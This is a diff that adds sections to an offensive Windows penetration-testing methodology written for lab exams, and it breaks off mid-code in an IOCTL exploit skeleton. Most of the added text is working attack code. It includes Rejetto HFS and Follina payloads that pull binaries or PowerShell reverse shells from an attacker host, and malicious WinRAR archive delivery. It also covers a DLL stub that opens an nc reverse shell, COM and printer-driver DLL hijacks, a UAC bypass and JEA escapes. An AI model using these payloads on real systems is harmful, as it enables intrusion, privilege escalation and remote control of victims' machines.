@@ -300,6 +300,106 @@ searchsploit <SERVICE> <VERSION>
 searchsploit -m <EXPLOIT_ID>   # Mirror exploit to current directory
 ```
 
+### 2.6b CVE-2014-6287 — Rejetto HFS Pre-Auth RCE (HttpFileServer <= 2.3)
+
+Rejetto HTTP File Server versions <= 2.3 are vulnerable to remote code execution via null-byte expression parsing in the search parameter. Common on HTB/OSCP/CPTS lab boxes (machine: Optimum).
+
+```bash
+# Fingerprint — HFS banner in Server header
+curl -s -I http://<TARGET>:<PORT>/ | grep -i 'server'
+# Expected: Server: HFS 2.3  (or lower)
+nmap -p <PORT> -sV -Pn <TARGET>  # HttpFileServer httpd 2.3
+
+# Manual PoC — null-byte scripting injection via search parameter
+# Payload executes VBScript that downloads and runs attacker binary
+curl -s "http://<TARGET>:<PORT>/?search=%00{.exec|C%3a%5cWindows%5cSystem32%5ccmd.exe+/c+certutil+-urlcache+-f+http%3a//<ATTACKER_IP>/<PAYLOAD>.exe+C%3a%5cWindows%5cTemp%5c<PAYLOAD>.exe.}" > /dev/null
+curl -s "http://<TARGET>:<PORT>/?search=%00{.exec|C%3a%5cWindows%5cTemp%5c<PAYLOAD>.exe.}" > /dev/null
+
+# Nishang PowerShell one-liner variant
+# URL-encode: powershell IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/shell.ps1')
+curl -s "http://<TARGET>:<PORT>/?search=%00{.exec|C%3a%5cWindows%5cSystem32%5cWindowsPowerShell%5cv1.0%5cpowershell.exe+-nop+-ep+bypass+-c+IEX(New-Object+Net.WebClient).DownloadString('http://<ATTACKER_IP>/Invoke-PowerShellTcp.ps1').}" > /dev/null
+
+# Metasploit
+# msfconsole → use exploit/windows/http/rejetto_hfs_exec
+# set RHOSTS <TARGET> → set RPORT <PORT> → set LHOST <ATTACKER_IP> → run
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# No LOTL applies — this is an initial-access exploit fired from the attacker box.
+# The exploit itself abuses native Windows binaries (certutil/powershell) on the target for staging.
+```
+
+### 2.6c CVE-2022-30190 Follina — MSDT ms-msdt URI Handler RCE
+
+Pre-auth RCE via a malicious Office document (or HTML file) that invokes the `ms-msdt:` protocol handler, which calls `msdt.exe` with attacker-controlled diagnostic parameters including PowerShell execution. No macros required — works with Protected View disabled or via RTF (which does not trigger Protected View).
+
+```bash
+# Generate Follina payload (john-hammond PoC or manual)
+# https://github.com/JohnHammond/msdt-follina
+python3 follina.py -i <ATTACKER_IP> -p <ATTACKER_PORT> -r <PORT_FOR_HTTP>
+# Outputs: follina.doc (or .docx) + starts HTTP listener serving the HTML payload
+
+# Manual payload construction — HTML file that triggers ms-msdt:
+# The HTML uses an OLEObject in the document that references an external HTML:
+# <Relationship ... Target="http://<ATTACKER_IP>/exploit.html" TargetMode="External"/>
+# exploit.html contains:
+# <script>location.href="ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebsowseForFile=? /param IT_LaunchMethod=ContextMenu /param IT_BrowseForFile=/$(IEX($(cmd /c 'calc.exe')))/../../$(powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/shell.ps1'))/.. \""; </script>
+
+# RTF variant (bypasses Protected View — RTF auto-renders OLE objects)
+python3 follina.py -i <ATTACKER_IP> -p <ATTACKER_PORT> -r <PORT_FOR_HTTP> -t rtf
+```
+
+```bash
+# Delivery — host the doc and HTML on attacker, social-engineer the click
+# Or serve via already-compromised web server / email attachment
+sudo python3 -m http.server <PORT_FOR_HTTP>  # serves exploit.html + stages
+# Listener for callback:
+rlwrap nc -lvnp <ATTACKER_PORT>
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# The exploit itself IS LOTL — it abuses msdt.exe (signed Microsoft binary) to execute PowerShell.
+# From the target's perspective, only msdt.exe and powershell.exe run — no dropped binaries.
+# Mitigation check (if this was patched):
+# reg query "HKCR\ms-msdt" → if key absent, the handler is disabled (patched)
+```
+
+### 2.6d WinRAR ACE Path-Traversal Arbitrary File Write (CVE-2018-20250)
+
+WinRAR versions prior to 5.61 use a vulnerable `UNACEV2.DLL` for ACE archive extraction. A crafted ACE archive (disguised as `.rar`) writes files to arbitrary paths during extraction, enabling code execution by dropping into Startup or other auto-run locations.
+
+```bash
+# Generate malicious ACE archive (on attacker)
+# https://github.com/WyAtu/CVE-2018-20250 (evilWinRAR generator)
+python3 evilWinRAR.py -o payload.rar -e C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\Start\ Menu\Programs\Startup\shell.exe -p <PAYLOAD_EXE>
+
+# Alternative: acefile.py (https://github.com/droe/acefile)
+# Craft ACE with path traversal: ../../../Users/<USER>/AppData/Roaming/.../Startup/payload.exe
+
+# Delivery — place on a share the target user will browse, or send via email
+# When victim extracts with WinRAR < 5.61, payload drops into their Startup folder
+```
+
+```bash
+# Check WinRAR version on target (post-foothold — confirm vulnerability)
+reg query "HKLM\SOFTWARE\WinRAR" /v "exe64" 2>nul
+reg query "HKLM\SOFTWARE\WOW6432Node\WinRAR" 2>nul
+dir "C:\Program Files\WinRAR\WinRAR.exe"
+# (Get-Item "C:\Program Files\WinRAR\WinRAR.exe").VersionInfo.FileVersion
+# Vulnerable if < 5.61
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# No LOTL — this is a client-side initial-access exploit. The archive generation happens on the attacker.
+# The exploit abuses WinRAR's UNACEV2.DLL on the victim during normal extraction.
+```
+
 ### 2.7 AS-REP Roasting (No Prior Creds Needed)
 
 > AS-REP roasting (impacket-GetNPUsers + hashcat -m 18200, plus LOTL adsisearcher variant) — see [active-directory-methodology.md](active-directory-methodology.md) §1.4 for the canonical chain.
@@ -413,6 +513,43 @@ ipconfig /all | findstr "IPv4"
 ipconfig /all | findstr "DNS"
 ```
 
+### 3.2b Mapped / Hidden Drive Enumeration
+
+Already-mapped drives on a compromised host reveal lateral pivot targets (file servers, NAS, DFS roots) without additional network scanning.
+
+```powershell
+# PowerShell — all PSDrives including mapped network drives
+Get-PSDrive -PSProvider FileSystem | Where-Object { $_.DisplayRoot } | Format-Table Name, DisplayRoot, Used, Free
+
+# WMI — mapped logical disks (DriveType 4 = Network)
+Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 4 } | Select DeviceID, ProviderName, VolumeName
+
+# WMI — MappedLogicalDisk class (user-mapped only, not system)
+Get-WmiObject Win32_MappedLogicalDisk | Select Name, ProviderName, SessionID
+
+# Persistent mappings stored in registry (survive logoff)
+Get-ChildItem 'HKCU:\Network' -ErrorAction SilentlyContinue | ForEach-Object {
+    Get-ItemProperty $_.PSPath | Select PSChildName, RemotePath, UserName
+}
+```
+
+```cmd
+:: cmd.exe native — shows active net use mappings
+net use
+
+:: wmic for all logical disks
+wmic logicaldisk where drivetype=4 get caption,providername,volumename
+```
+
+#### Living-off-the-land / LOTL variant
+
+```cmd
+:: Pure cmd.exe — no PowerShell needed
+net use
+reg query HKCU\Network /s 2>nul
+wmic logicaldisk where drivetype=4 get caption,providername
+```
+
 ### 3.3 Firewall & Defender Status
 ```powershell
 # Windows Firewall status
@@ -433,6 +570,99 @@ netsh advfirewall firewall add rule name="Allow Port" dir=in action=allow protoc
 wmic product get name,version
 wmic qfe list brief
 # Look for missing critical patches — compare against known CVEs
+```
+
+#### 3.4b Installed Application Binary Version Fingerprinting (Non-MSI)
+
+`wmic product` only lists MSI-installed software. Many applications (portable, NSIS, InnoSetup) are invisible to it. Use PE FileVersionInfo to fingerprint every EXE in Program Files for CVE lookup.
+
+```powershell
+# Get-Process bulk version dump — shows version of every running process
+Get-Process | Where-Object { $_.Path } | Select-Object Name, Path,
+    @{n='FileVersion';e={$_.FileVersionInfo.FileVersion}},
+    @{n='ProductVersion';e={$_.FileVersionInfo.ProductVersion}} |
+  Sort-Object Name | Format-Table -AutoSize
+
+# Recursive EXE scan across Program Files (catches non-MSI installs)
+Get-ChildItem 'C:\Program Files','C:\Program Files (x86)' -Recurse -Filter *.exe -ErrorAction SilentlyContinue |
+  ForEach-Object {
+    $v = [System.Diagnostics.FileVersionInfo]::GetVersionInfo($_.FullName)
+    if ($v.FileVersion) {
+      [PSCustomObject]@{
+        Name = $_.Name
+        Path = $_.FullName
+        FileVersion = $v.FileVersion
+        ProductName = $v.ProductName
+        CompanyName = $v.CompanyName
+      }
+    }
+  } | Format-Table -AutoSize
+
+# Single binary version check (quick targeted lookup)
+(Get-Item "C:\Program Files\<APP>\<BINARY>.exe").VersionInfo | Format-List ProductName, FileVersion, ProductVersion
+```
+
+```cmd
+:: cmd.exe — wmic for a single file
+wmic datafile where "name='C:\\Program Files\\<APP>\\<BINARY>.exe'" get Version,Manufacturer
+```
+
+#### Living-off-the-land / LOTL variant
+
+```cmd
+:: Pure cmd.exe — no PowerShell needed
+:: Uses filever.exe if available (Resource Kit) or falls back to wmic datafile
+for /R "C:\Program Files" %f in (*.exe) do @wmic datafile where "name='%f'" get Name,Version 2>nul | findstr /v "^$"
+```
+
+### 3.5 Local Group Policy Privilege Rights Enumeration
+
+Parse `GptTmpl.inf` cached on disk for `[Privilege Rights]` assignments. `SeServiceLogonRight` reveals service accounts (often with weak passwords); `SeInteractiveLogonRight` / `SeBatchLogonRight` reveal high-value accounts that may be Kerberoastable or RDP-able.
+
+```cmd
+:: Export local security policy to INF (any user can read the export)
+secedit /export /cfg C:\Windows\Temp\secpol.inf /areas USER_RIGHTS
+
+:: Grep for interesting privilege assignments
+findstr /i "SeServiceLogonRight SeInteractiveLogonRight SeBatchLogonRight SeNetworkLogonRight SeBackupPrivilege SeRestorePrivilege" C:\Windows\Temp\secpol.inf
+```
+
+```powershell
+# PowerShell — parse the exported INF for Privilege Rights section
+secedit /export /cfg "$env:TEMP\secpol.inf" /areas USER_RIGHTS | Out-Null
+$rights = Get-Content "$env:TEMP\secpol.inf" | Where-Object { $_ -match 'Se\w+Privilege|Se\w+Right' }
+$rights | ForEach-Object { Write-Output $_ }
+
+# Resolve SIDs to account names
+$rights | ForEach-Object {
+    $line = $_
+    [regex]::Matches($_, '\*S-1-[\d-]+') | ForEach-Object {
+        $sid = $_.Value.TrimStart('*')
+        try {
+            $name = (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount]).Value
+            $line = $line -replace [regex]::Escape($_.Value), "$($_.Value)($name)"
+        } catch {}
+    }
+    Write-Output $line
+}
+```
+
+```powershell
+# Read cached GPO GptTmpl.inf files directly (no secedit needed)
+Get-ChildItem -Recurse 'C:\Windows\System32\GroupPolicy' -Filter 'GptTmpl.inf' -ErrorAction SilentlyContinue |
+  ForEach-Object {
+    Write-Output "=== $($_.FullName) ==="
+    Get-Content $_.FullName | Select-String 'SeServiceLogonRight|SeBatchLogonRight|SeInteractiveLogonRight'
+  }
+```
+
+#### Living-off-the-land / LOTL variant
+
+```cmd
+:: Pure cmd.exe — secedit is a native binary
+secedit /export /cfg %TEMP%\secpol.inf /areas USER_RIGHTS
+type %TEMP%\secpol.inf | findstr /i "Right Privilege"
+del %TEMP%\secpol.inf
 ```
 
 ---
@@ -1040,6 +1270,198 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o hija
 # NATIVE DLL compilation (if you have access to csc.exe on target — no msfvenom needed)
 # Create C# source that compiles to DLL:
 # See LOLBins: https://lolbas-project.github.io
+```
+
+#### 4.4b Custom mingw DLL with DllMain Stub (AV-evading DLL Hijack Payload)
+
+When msfvenom-generated DLLs get flagged, compile a minimal C DLL stub on the attacker box that executes a command in `DLL_PROCESS_ATTACH`. Smaller, no msfvenom signatures, trivially customizable.
+
+```c
+/* hijack.c — compile with mingw on attacker, drop as the missing DLL name */
+#include <windows.h>
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        system("cmd.exe /c C:\\Windows\\Temp\\nc.exe <ATTACKER_IP> <ATTACKER_PORT> -e cmd.exe");
+        /* Or: WinExec("powershell -ep bypass -enc <BASE64_PAYLOAD>", 0); */
+    }
+    return TRUE;
+}
+```
+
+```bash
+# Cross-compile on Kali — x64
+x86_64-w64-mingw32-gcc hijack.c -o <MISSING_DLL_NAME>.dll -shared -lws2_32 -s
+
+# x86 variant
+i686-w64-mingw32-gcc hijack.c -o <MISSING_DLL_NAME>.dll -shared -lws2_32 -s
+
+# Proxy DLL — forward all exports to the real DLL so the app doesn't crash
+# Add #pragma comment(linker, "/export:<FUNC_NAME>=<REAL_DLL>.<FUNC_NAME>") per export
+# Use 'dumpbin /exports <REAL_DLL>.dll' (MSVC) or 'winedump -j export <REAL_DLL>.dll' on Kali
+```
+
+#### Living-off-the-land / LOTL variant
+
+```powershell
+# On-target C# compilation via csc.exe (no file transfer of a DLL needed)
+$src = @'
+using System;
+using System.Runtime.InteropServices;
+public class Init {
+    [DllExport("DllMain", CallingConvention.StdCall)]
+    public static bool DllMain(IntPtr hModule, uint reason, IntPtr lpReserved) {
+        if (reason == 1) { System.Diagnostics.Process.Start("cmd.exe", "/c C:\\Windows\\Temp\\payload.exe"); }
+        return true;
+    }
+}
+'@
+$src | Out-File C:\Windows\Temp\hijack.cs
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:C:\Windows\Temp\<MISSING_DLL_NAME>.dll C:\Windows\Temp\hijack.cs
+# Note: pure csc.exe cannot produce unmanaged DLL exports without DllExport NuGet; use managed DLL load chains or compile offline with mingw
+```
+
+#### 4.4c COM/CLSID InprocServer32 Registry Hijack
+
+Distinct from DLL search-order abuse: target a COM CLSID whose `InprocServer32` registry key has weak ACLs, redirect it to an attacker DLL. When any process (including SYSTEM services) `CoCreateInstance` that CLSID, your DLL loads in their context.
+
+```powershell
+# === Enumerate CLSIDs with writable InprocServer32 keys ===
+Get-ChildItem 'HKLM:\SOFTWARE\Classes\CLSID' -Recurse -ErrorAction SilentlyContinue |
+  Where-Object { $_.PSChildName -eq 'InprocServer32' } |
+  ForEach-Object {
+    $acl = Get-Acl $_.PSPath -ErrorAction SilentlyContinue
+    $bad = $acl.Access | Where-Object {
+      $_.IdentityReference -match 'Users|Everyone|Authenticated' -and
+      $_.RegistryRights -match 'SetValue|FullControl'
+    }
+    if ($bad) {
+      [PSCustomObject]@{
+        CLSID = ($_.PSPath -split 'CLSID\\')[1] -replace '\\InprocServer32',''
+        Path  = (Get-ItemProperty $_.PSPath).'(Default)'
+        Who   = ($bad.IdentityReference -join ',')
+      }
+    }
+  }
+
+# Also check HKCU (per-user COM overrides take precedence over HKLM)
+Get-ChildItem 'HKCU:\SOFTWARE\Classes\CLSID' -Recurse -ErrorAction SilentlyContinue |
+  Where-Object { $_.PSChildName -eq 'InprocServer32' }
+```
+
+```powershell
+# === Hijack — redirect InprocServer32 to attacker DLL ===
+# Pick a CLSID triggered by a SYSTEM service (e.g., Task Scheduler, BITS, Update Orchestrator)
+reg add "HKLM\SOFTWARE\Classes\CLSID\{<TARGET_CLSID>}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\Temp\<PAYLOAD>.dll" /f
+reg add "HKLM\SOFTWARE\Classes\CLSID\{<TARGET_CLSID>}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Both" /f
+
+# Or HKCU override (no admin — per-user CLSID wins over HKLM)
+reg add "HKCU\SOFTWARE\Classes\CLSID\{<TARGET_CLSID>}\InprocServer32" /ve /t REG_SZ /d "C:\Users\<USER>\AppData\Local\Temp\<PAYLOAD>.dll" /f
+reg add "HKCU\SOFTWARE\Classes\CLSID\{<TARGET_CLSID>}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Both" /f
+
+# Trigger — force CoCreateInstance of the CLSID
+rundll32.exe -sta {<TARGET_CLSID>}
+# Or wait for a scheduled task / service restart that naturally loads it
+```
+
+#### Living-off-the-land / LOTL variant
+
+```powershell
+# Pure PowerShell enumeration + HKCU hijack (no admin, no tools)
+# Create HKCU override pointing to a DLL already writable by current user
+New-Item -Path "HKCU:\SOFTWARE\Classes\CLSID\{<TARGET_CLSID>}\InprocServer32" -Force
+Set-ItemProperty -Path "HKCU:\SOFTWARE\Classes\CLSID\{<TARGET_CLSID>}\InprocServer32" -Name '(Default)' -Value "C:\Users\$env:USERNAME\AppData\Local\Temp\<PAYLOAD>.dll"
+Set-ItemProperty -Path "HKCU:\SOFTWARE\Classes\CLSID\{<TARGET_CLSID>}\InprocServer32" -Name 'ThreadingModel' -Value 'Both'
+```
+
+### 4.4d UAC Bypass via SystemPropertiesAdvanced.exe + srrstr.dll DLL Hijack
+
+Auto-elevated binary `SystemPropertiesAdvanced.exe` loads `srrstr.dll` from PATH directories. If `WindowsApps` (or another user-writable dir) appears in PATH before System32, plant a DLL there for high-integrity code execution without a UAC prompt.
+
+```powershell
+# Confirm WindowsApps is in PATH and writable by current user
+$env:PATH -split ';' | Where-Object { $_ -match 'WindowsApps' } | ForEach-Object {
+    Write-Output $_
+    icacls $_
+}
+
+# Also check other writable PATH dirs
+for %p in ("%PATH:;=" "%") do @icacls %p 2>nul | findstr /i "(M) (W) (F)" && echo [WRITABLE PATH DIR] %p
+
+# Compile payload DLL on attacker (see 4.4b for DllMain stub)
+x86_64-w64-mingw32-gcc hijack.c -o srrstr.dll -shared -lws2_32 -s
+
+# Drop the DLL into the writable PATH directory
+copy C:\Windows\Temp\srrstr.dll "%LOCALAPPDATA%\Microsoft\WindowsApps\srrstr.dll"
+
+# Trigger — auto-elevates to high integrity, loads our DLL
+SystemPropertiesAdvanced.exe
+```
+
+#### Living-off-the-land / LOTL variant
+
+```powershell
+# On-target detection only (no DLL compilation) — confirm the primitive exists
+# If WindowsApps is writable and in PATH before System32, the condition is met
+$writable = $env:PATH -split ';' | Where-Object {
+    $_ -match 'WindowsApps' -and (Test-Path $_) -and
+    (Get-Acl $_ -ErrorAction SilentlyContinue).Access |
+    Where-Object { $_.IdentityReference -match $env:USERNAME -and $_.FileSystemRights -match 'Write|Modify|Full' }
+}
+if ($writable) { Write-Output "[+] UAC bypass viable via SystemPropertiesAdvanced.exe + srrstr.dll in: $writable" }
+
+# Use csc.exe to build a managed DLL on-target if mingw is unavailable
+# (limited — managed DLL requires DllExport or COM registration; prefer cross-compile)
+```
+
+### 4.4e Windows Printer Driver Directory DLL-Plant Privesc
+
+Distinct from PrintNightmare (CVE exploit): this targets writable vendor printer driver subdirectories under `DriverStore\FileRepository` or `spool\drivers\x64\3` (common Ricoh/Lexmark ACL misconfiguration). When a print job fires or `Add-Printer` triggers a driver reload, the Spooler service (SYSTEM) loads DLLs from these directories.
+
+```powershell
+# === Enumerate printer driver directories for weak ACLs ===
+Get-PrinterDriver | ForEach-Object {
+    $driverPath = Split-Path $_.ConfigFile
+    Write-Output "Driver: $($_.Name) → $driverPath"
+    icacls $driverPath
+} | Out-String | Select-String -Pattern 'BUILTIN\\Users|Everyone|Authenticated Users'
+
+# Check spool\drivers tree directly
+icacls "C:\Windows\System32\spool\drivers\x64\3" /T | findstr /i "BUILTIN\\Users Everyone Authenticated"
+
+# DriverStore\FileRepository — third-party drivers live here
+Get-ChildItem 'C:\Windows\System32\DriverStore\FileRepository' -Directory |
+  Where-Object { $_.Name -match 'ricoh|lexmark|canon|hp|xerox|brother|konica' } |
+  ForEach-Object {
+    $acl = Get-Acl $_.FullName -ErrorAction SilentlyContinue
+    $bad = $acl.Access | Where-Object {
+      $_.IdentityReference -match 'Users|Everyone|Authenticated' -and
+      $_.FileSystemRights -match 'Write|Modify|FullControl'
+    }
+    if ($bad) { Write-Output "[WRITABLE] $($_.FullName) → $($bad.IdentityReference)" }
+  }
+```
+
+```powershell
+# === Identify which DLL to replace ===
+# Driver config files reveal DLLs loaded by the Spooler
+Get-PrinterDriver | Select-Object Name, ConfigFile, DataFile, HelpFile, DependentFiles | Format-List
+# Look for DLLs inside the writable driver directory
+
+# === Plant malicious DLL (use mingw stub from 4.4b) ===
+copy C:\Windows\Temp\<PAYLOAD>.dll "C:\Windows\System32\spool\drivers\x64\3\<TARGET_DLL>.dll"
+
+# Trigger reload — add/remove a printer or restart Spooler
+Add-Printer -Name "TestPrinter" -DriverName "<DRIVER_NAME>" -PortName "LPT1:" -ErrorAction SilentlyContinue
+# Or restart Spooler (requires admin; if already admin, use for SYSTEM escalation)
+Restart-Service Spooler
+```
+
+#### Living-off-the-land / LOTL variant
+
+```cmd
+:: Pure cmd.exe enumeration — no PowerShell
+icacls "C:\Windows\System32\spool\drivers\x64\3" /T 2>nul | findstr /i "Users Everyone WRITE MODIFY FULL"
+dir /s /b "C:\Windows\System32\DriverStore\FileRepository\*ricoh*" "C:\Windows\System32\DriverStore\FileRepository\*lexmark*"
 ```
 
 ### 4.5 AlwaysInstallElevated
@@ -1678,6 +2100,15 @@ reg delete HKCU\Software\Classes\mscfile /f
 # UACME — collection of UAC bypass methods
 # https://github.com/hfiref0x/UACME
 .\Akagi64.exe <METHOD_NUMBER> "C:\temp\shell.exe"
+
+# === SystemPropertiesAdvanced.exe + srrstr.dll DLL Hijack (auto-elevated) ===
+# SystemPropertiesAdvanced.exe is auto-elevated (high IL without UAC prompt).
+# It loads srrstr.dll from PATH dirs; if WindowsApps is in user PATH and writable:
+$env:PATH -split ';' | Where-Object { $_ -match 'WindowsApps' } | ForEach-Object { icacls $_ }
+# Confirm writable → drop DLL:
+copy C:\Windows\Temp\<PAYLOAD>.dll "$env:LOCALAPPDATA\Microsoft\WindowsApps\srrstr.dll"
+# Trigger — auto-elevates, loads our DLL at high IL
+SystemPropertiesAdvanced.exe
 ```
 
 ### 4.9 Kernel & System Exploits
@@ -2130,6 +2561,143 @@ Add-Type -Path 'C:\Windows\assembly\GAC_MSIL\System.Management.Automation\*\Syst
 > **OPSEC:** Bypassing the AppLocker path/publisher check does NOT bypass Module/Script Block logging or AMSI — those hook the runtime, not the binary. Pair with AMSI/ETW patches from §4.10 before running real payloads.
 
 ---
+
+### 4.11b JEA (Just Enough Administration) Endpoint Enumeration & Abuse
+
+JEA constrains PowerShell sessions to a whitelist of cmdlets/functions via `.psrc` Role Capability files. Misconfigurations in the allowed command set allow escaping to full language mode or executing arbitrary code as the virtual RunAs account (often SYSTEM-equivalent).
+
+```powershell
+# === ENUMERATE JEA ENDPOINTS ===
+# List all registered PS session configurations (JEA endpoints have custom names)
+Get-PSSessionConfiguration | Format-Table Name, RunAsUser, Permission -AutoSize
+
+# Identify non-default endpoints (Microsoft.PowerShell / microsoft.powershell32 are default)
+Get-PSSessionConfiguration | Where-Object { $_.Name -notmatch '^microsoft\.' }
+
+# Check if current user can connect to a JEA endpoint
+$ep = '<JEA_ENDPOINT_NAME>'
+Get-PSSessionConfiguration -Name $ep | Select-Object Name, Permission, RunAsVirtualAccount, RunAsVirtualAccountGroups
+
+# Connect to the JEA endpoint
+Enter-PSSession -ComputerName <TARGET> -ConfigurationName $ep -Credential $cred
+# Or locally:
+Enter-PSSession -ComputerName localhost -ConfigurationName $ep
+```
+
+```powershell
+# === ENUMERATE ALLOWED COMMANDS INSIDE JEA SESSION ===
+# Once connected to the JEA endpoint:
+Get-Command                              # lists all available cmdlets/functions
+Get-Command | Measure-Object             # count — small list = tight JEA
+Get-Command -CommandType Function        # custom functions defined in .psrc
+$ExecutionContext.SessionState.LanguageMode  # NoLanguage / ConstrainedLanguage / RestrictedLanguage
+```
+
+```powershell
+# === LOCATE .psrc / .pssc FILES ON DISK (from a separate admin shell) ===
+# Role Capability files define allowed commands
+Get-ChildItem -Path 'C:\Program Files\WindowsPowerShell\Modules' -Recurse -Filter *.psrc
+Get-ChildItem -Path 'C:\Windows\System32\WindowsPowerShell\v1.0\Modules' -Recurse -Filter *.psrc
+
+# Session Configuration files define endpoint settings
+Get-ChildItem -Path "$env:ProgramData\JEAConfiguration" -Recurse -Filter *.pssc -ErrorAction SilentlyContinue
+Get-ChildItem -Path 'C:\Windows\System32\WindowsPowerShell\v1.0\SessionConfig' -Filter *.pssc -ErrorAction SilentlyContinue
+
+# Read the .psrc to see VisibleCmdlets, VisibleFunctions, VisibleExternalCommands
+Get-Content '<PATH_TO>.psrc'
+```
+
+```powershell
+# === JEA ESCAPE TECHNIQUES ===
+
+# Escape 1: If Set-Content / Add-Content / Out-File is allowed — write a script and execute
+# (works because file-write cmdlets can create .ps1 that runs outside JEA)
+Set-Content -Path C:\Windows\Temp\escape.ps1 -Value 'whoami > C:\Windows\Temp\jea_proof.txt'
+# Then trigger via scheduled task or another allowed command
+
+# Escape 2: If Start-Job / Start-Process is in the allowed list
+Start-Process cmd.exe -ArgumentList '/c whoami > C:\Windows\Temp\jea_proof.txt'
+
+# Escape 3: Function definition within the JEA session (if LanguageMode allows it)
+function Invoke-Escape { & cmd.exe /c "C:\Windows\Temp\nc.exe <ATTACKER_IP> <PORT> -e cmd.exe" }
+Invoke-Escape
+
+# Escape 4: If Invoke-Command is allowed — target localhost outside JEA
+Invoke-Command -ComputerName localhost -ScriptBlock { whoami /all }
+
+# Escape 5: If a visible cmdlet accepts -ScriptBlock or -ArgumentList that gets eval'd
+# Example: allowed cmdlet with -Command / -ScriptBlock parameter
+<ALLOWED_CMDLET> -ScriptBlock { whoami > C:\Windows\Temp\jea_proof.txt }
+
+# Escape 6: RunAsVirtualAccount = SYSTEM-equivalent — any writable escape = instant LPE
+# JEA virtual accounts are members of local Administrators by default
+```
+
+#### Living-off-the-land / LOTL variant
+
+```powershell
+# Pure enumeration with no tools — works from any PS session
+Get-PSSessionConfiguration | Format-List Name, RunAsUser, RunAsVirtualAccount, Permission
+# Try connecting to each non-default endpoint
+foreach ($cfg in (Get-PSSessionConfiguration | Where-Object { $_.Name -notmatch '^microsoft\.' })) {
+    try {
+        $s = New-PSSession -ConfigurationName $cfg.Name -ComputerName localhost -ErrorAction Stop
+        Write-Output "[+] Connected to $($cfg.Name) — enumerating commands..."
+        Invoke-Command -Session $s -ScriptBlock { Get-Command | Select-Object Name,CommandType }
+        Remove-PSSession $s
+    } catch {
+        Write-Output "[-] Cannot connect to $($cfg.Name): $($_.Exception.Message)"
+    }
+}
+```
+
+### 4.11c WoW64 Filesystem Redirection Escape (32-bit to 64-bit Shell)
+
+When initial access lands in a 32-bit process (x86 web shell, 32-bit msfvenom payload, WoW64 IIS AppPool), system utilities and DLLs resolve to `C:\Windows\SysWOW64` instead of the real `System32`. Many privesc tools and exploits require 64-bit context. Detect and escape via `Sysnative`.
+
+```cmd
+:: Detect WoW64 redirection — if PROCESSOR_ARCHITECTURE is x86 on a 64-bit OS, you are in WoW64
+echo %PROCESSOR_ARCHITECTURE%
+:: x86 = 32-bit process on 64-bit OS (WoW64 active)
+:: AMD64 = native 64-bit process (no escape needed)
+
+:: Confirm OS is actually 64-bit
+wmic os get osarchitecture
+
+:: Escape — spawn 64-bit cmd.exe via Sysnative virtual path
+:: Sysnative is a kernel-provided alias that bypasses WoW64 redirection
+C:\Windows\Sysnative\cmd.exe /c whoami
+C:\Windows\Sysnative\cmd.exe
+
+:: 64-bit PowerShell from 32-bit context
+C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe -ep bypass
+```
+
+```powershell
+# PowerShell detection and escape
+if ([IntPtr]::Size -eq 4 -and [Environment]::Is64BitOperatingSystem) {
+    Write-Output "[!] Running in WoW64 (32-bit) — escaping to 64-bit"
+    & "$env:SystemRoot\Sysnative\WindowsPowerShell\v1.0\powershell.exe" -ep bypass -NoProfile
+} else {
+    Write-Output "[+] Already in native 64-bit context"
+}
+
+# Generate a 64-bit reverse shell from a 32-bit foothold
+C:\Windows\Sysnative\cmd.exe /c "C:\Windows\Temp\nc64.exe <ATTACKER_IP> <PORT> -e C:\Windows\Sysnative\cmd.exe"
+```
+
+#### Living-off-the-land / LOTL variant
+
+```cmd
+:: Pure cmd.exe — no tools needed
+:: Check architecture then call Sysnative directly
+if "%PROCESSOR_ARCHITECTURE%"=="x86" (
+    echo [!] WoW64 detected — spawning 64-bit shell
+    C:\Windows\Sysnative\cmd.exe
+) else (
+    echo [+] Already 64-bit
+)
+```
 
 ### 4.12 Windows Defender Evasion Tips
 
@@ -2816,6 +3384,91 @@ Get-Item \\.\RTCore64       -ErrorAction SilentlyContinue
 
 > **OPSEC:** `driverquery` and `fltmc` are signed Microsoft LOLBins, low-noise on EDR. The diff and LOLDrivers cross-reference happen **attacker-side** — only the driver enumeration runs on target.
 
+#### 4.21c-2 Custom Vulnerable Driver RE — Ghidra Analysis + IOCTL Exploitation
+
+When a non-LOLDrivers custom driver is discovered (vendor-specific, not in public databases), reverse-engineer it in Ghidra to find exploitable IOCTL handlers, then invoke via `DeviceIoControl`.
+
+```bash
+# === Pull the driver binary to attacker box for RE ===
+# From target (after identifying the .sys path via driverquery or CimInstance):
+copy "C:\Windows\System32\drivers\<CUSTOM_DRIVER>.sys" \\<ATTACKER_IP>\share\
+
+# === Ghidra RE workflow (attacker box) ===
+# 1. Import the .sys as a PE/COFF binary (x64)
+# 2. Analyze → find DriverEntry function (entry point)
+# 3. In DriverEntry, locate MajorFunction[IRP_MJ_DEVICE_CONTROL] assignment
+#    (offset 0x70 in DriverObject->MajorFunction array = IRP_MJ_DEVICE_CONTROL = 14)
+# 4. Follow the IOCTL dispatch function
+# 5. Map IOCTL codes: CTL_CODE(DeviceType, Function, Method, Access)
+#    Switch/case on IoControlCode from IRP → Io->Parameters.DeviceIoControl.IoControlCode
+# 6. Look for: MmMapLockedPages, ProbeForWrite, memcpy to/from user buffer,
+#    MmGetPhysicalAddress, or direct physical memory R/W primitives
+```
+
+```c
+/* === Exploit skeleton — invoke discovered IOCTL from userland ===
+   Compile on Kali: x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32 -static */
+#include <windows.h>
+#include <stdio.h>
+
